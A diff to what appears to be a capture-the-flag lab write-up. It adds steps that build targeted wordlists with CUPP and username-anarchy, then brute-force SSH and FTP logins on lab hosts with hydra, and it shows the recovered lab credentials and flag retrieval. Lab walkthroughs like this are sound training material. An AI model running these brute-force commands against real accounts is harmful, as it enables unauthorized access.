@@ -315,7 +315,7 @@ This server already has this file installed when we ssh in. So we can run:
 
 Then we get `host: 127.0.0.1   login: m.gates   password: computer`
 
-So we can run ftp 127.0.0.1
+So we can run `ftp 127.0.0.1`
 
 Then when we use the credentials to log in we can run:
 ```
@@ -371,10 +371,42 @@ We also know the password requirements are:
     Must contain numbers
     Must contain special characters
 
-Running Cupp, with as much information as we could get from the Wiki, I got Harry.txt. But then I needed to remove the lines that don't match the password requirements. So I ran:
+Running Cupp (like `python3 cupp.py -i`, with as much information as we could get from the Wiki, I got Harry.txt. But then I needed to remove the lines that don't match the password requirements. So I ran:
 
-`cat Harry.txt | sed -r '/^.{,7}$/d' | sed -r '/[!-/:-@\[-`\{-~]+/!d' | sed -r '/[0-9]+/!d' > harry.txt`
+`cat harry.txt | sed -r '/^.{,7}$/d' | sed -r '/[!-/:-@\[-`\{-~]+/!d' | sed -r '/[0-9]+/!d' > Harry.txt`
 
+To get a list of usernames I ran:
+`./username-anarchy Harry Potter > potter.txt`
 
+Running: `hydra -L potter.txt -P shortHarry.txt -u -f -M servers.txt -t 4 ssh`
+
+I originally created a much larger list of passwords. But it was taking forever, so I read the hint and it said just use the first name.
+
+This returns the username as harry.potter password H4rry!!!
+
+Once I ssh in, I can just run cat flag.txt
 
 Once you are in, you should find that another user exists in server. Try to brute force their login, and get their flag. 
+
+Once I get connected I can run
+`ls /home` and see that g.potter is another user. So I can try and brute force her login too.
+
+I notice in my directory that the rockyou-30.txt file exists (good hint I can use that).
+
+So if I run:
+`netstat -antp | grep -i list`
+I notice that port 21 is open like in the previous exercise. So lets try to brute force the ftp login.
+
+`hydra -l g.potter -P rockyou-30.txt ftp://127.0.0.1`
+
+We get the login as:
+`[21][ftp] host: 127.0.0.1   login: g.potter   password: harry`
+
+So we can just run:
+`ftp 127.0.0.1`
+
+And run `get flag.txt`
+
+Then disconnect and run `cat flag.txt`
+
+And thats the end of it.
